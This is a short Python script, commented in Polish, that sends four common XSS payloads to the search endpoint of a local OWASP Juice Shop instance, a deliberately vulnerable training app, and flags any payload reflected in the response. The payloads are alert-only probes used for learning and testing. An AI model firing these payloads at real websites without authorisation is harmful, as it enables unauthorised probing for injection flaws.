import requests
from bs4 import BeautifulSoup

# URL do juice-shop
BASE_URL = "http://localhost:3000/search?q="

# Przykładowe popularne payloady XSS
xss_payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
]
# Wysyłamy zapytania z payloadami
for payload in xss_payloads:
    print(f"[+] Testuję payload: {payload}")
    try:
        # Wysyłamy zapytanie GET z payloadem
        response = requests.get(BASE_URL + requests.utils.quote(payload), timeout=5)
        response.raise_for_status()

    # Obsługa błędów
    except Exception as e:
        print(f"[-] Błąd przy zapytaniu: {e}")
    # Sprawdzamy, czy payload występuje w odpowiedzi
    if payload in response.text:
        print("[!] Możliwa podatność na XSS!")
    else:
        print("[-] Payload nieskuteczny.")


